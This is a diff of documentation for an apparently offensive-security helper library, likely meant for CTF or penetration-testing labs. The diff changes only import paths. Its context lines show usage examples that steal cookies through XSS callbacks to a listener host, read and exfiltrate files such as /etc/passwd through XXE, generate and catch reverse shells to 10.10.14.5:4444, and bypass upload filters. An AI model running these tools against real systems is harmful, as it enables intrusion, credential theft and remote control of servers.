@@ -10,7 +10,7 @@ Use colored output for better visibility instead of ``print()``:
 
 .. code-block:: python
 
-   from utils.output import out
+   from your_project.utils.output import out
 
    out.success("Target is vulnerable!")       # [+] Green
    out.error("Connection failed")             # [-] Red
@@ -27,8 +27,8 @@ Parse and use stolen cookies:
 
 .. code-block:: python
 
-   from utils.cookie import parse_cookie_string
-   from utils.server_hooks import get_cookie
+   from your_project.utils.cookie import parse_cookie_string
+   from your_project.utils.server_hooks import get_cookie
    import requests
 
    # Wait for XSS to steal cookie
@@ -49,7 +49,7 @@ Generate XSS payloads with automatic callbacks:
 
 .. code-block:: python
 
-   from utils.xss import img_onerror, blind_xss, cookie_stealer, polyglot
+   from your_project.utils.xss import img_onerror, blind_xss, cookie_stealer, polyglot
 
    # Quick test payload
    payload = img_onerror(f"http://{lhost}:8000")
@@ -64,7 +64,7 @@ Generate XSS payloads with automatic callbacks:
    payload = polyglot(f"http://{lhost}:8000")
 
    # Context-specific
-   from utils.xss import context_specific
+   from your_project.utils.xss import context_specific
    payload = context_specific(f"http://{lhost}:8000", context="attribute")
    # Contexts: html, attribute, js, css
 
@@ -75,7 +75,7 @@ Generate XXE payloads for file reading and SSRF:
 
 .. code-block:: python
 
-   from utils.xxe import quick_test, basic_file_read, php_filter_b64
+   from your_project.utils.xxe import quick_test, basic_file_read, php_filter_b64
 
    # Quick test (creates DTD + payload)
    payload = quick_test(f"http://{lhost}:8000", "/etc/passwd")
@@ -88,11 +88,11 @@ Generate XXE payloads for file reading and SSRF:
    payload = php_filter_b64("/var/www/html/config.php")
 
    # Format-specific
-   from utils.xxe import svg_xxe, soap_xxe
+   from your_project.utils.xxe import svg_xxe, soap_xxe
    svg_payload = svg_xxe(f"http://{lhost}:8000", "/etc/passwd")
 
    # Get exfiltrated data
-   from utils.server_hooks import get_exfil
+   from your_project.utils.server_hooks import get_exfil
    data = get_exfil(timeout=30)
 
 Reverse Shells
@@ -102,7 +102,7 @@ Generate shells dynamically:
 
 .. code-block:: python
 
-   from utils.reverse_shells import bash_shell, python_oneliner, quick_bash
+   from your_project.utils.reverse_shells import bash_shell, python_oneliner, quick_bash
 
    # Generate shell files
    path = bash_shell("10.10.14.5", 4444)
@@ -123,7 +123,7 @@ Catch reverse shells directly in Python (no netcat needed):
 
 .. code-block:: python
 
-   from utils.shell_catcher import ShellCatcher, auto_shell, quick_catch
+   from your_project.utils.shell_catcher import ShellCatcher, auto_shell, quick_catch
 
    # Method 1: Full control
    catcher = ShellCatcher(4444)
@@ -153,7 +153,7 @@ Upload files with bypass techniques:
 
 .. code-block:: python
 
-   from utils.file_upload import FileUploader, quick_upload
+   from your_project.utils.file_upload import FileUploader, quick_upload
 
    # Full control
    uploader = FileUploader("http://target/upload")
@@ -184,7 +184,7 @@ Intruder-style fuzzing with concurrency:
 .. code-block:: python
 
    import httpx
-   from utils.batch_request import (
+   from your_project.utils.batch_request import (
        batch_request_sync,
        generate_param_payloads,
        generate_json_payloads
@@ -228,7 +228,7 @@ Read callbacks from Apache logs instead of built-in server:
 
 .. code-block:: python
 
-   from utils.apache_hooks import get_cookie, get_exfil, get_param
+   from your_project.utils.apache_hooks import get_cookie, get_exfil, get_param
 
    # Get cookie from Apache logs
    cookie = get_cookie('/var/log/apache2/access.log', timeout=30)
@@ -241,7 +241,7 @@ Read callbacks from Apache logs instead of built-in server:
    value = get_param('data', '/var/log/apache2/access.log', timeout=30)
 
    # Watch in real-time
-   from utils.apache_hooks import watch_log
+   from your_project.utils.apache_hooks import watch_log
    watch_log('/var/log/apache2/access.log', params=['cookies', 'exfil'])
 
 CLI watch mode:
@@ -258,7 +258,7 @@ Get network interfaces and callback IPs:
 
 .. code-block:: python
 
-   from utils.network import get_interfaces, get_callback_host
+   from your_project.utils.network import get_interfaces, get_callback_host
 
    # Get all interfaces
    interfaces = get_interfaces()
@@ -275,7 +275,7 @@ Common encoding operations:
 
 .. code-block:: python
 
-   from utils.encoding import (
+   from your_project.utils.encoding import (
        b64_encode, b64_decode,
        url_encode, url_decode,
        to_hex, from_hex,
@@ -301,7 +301,7 @@ Easy BeautifulSoup wrapper:
 
 .. code-block:: python
 
-   from utils.html_parser import HTMLParser, quick_parse, parse_response
+   from your_project.utils.html_parser import HTMLParser, quick_parse, parse_response
 
    # Parse response
    parser = HTMLParser.from_response(response)
@@ -335,7 +335,7 @@ For blind time-based exploitation:
 
 .. code-block:: python
 
-   from utils.timing import time_request
+   from your_project.utils.timing import time_request
 
    def attempt(payload):
        return requests.get(f"http://target?id={payload}")
@@ -351,7 +351,7 @@ Create and extract zip files:
 
 .. code-block:: python
 
-   from utils.zip_util import quick_zip, zip_multiple, extract_zip
+   from your_project.utils.zip_util import quick_zip, zip_multiple, extract_zip
 
    # Quick zip
    quick_zip("payloads/", output="payloads.zip")
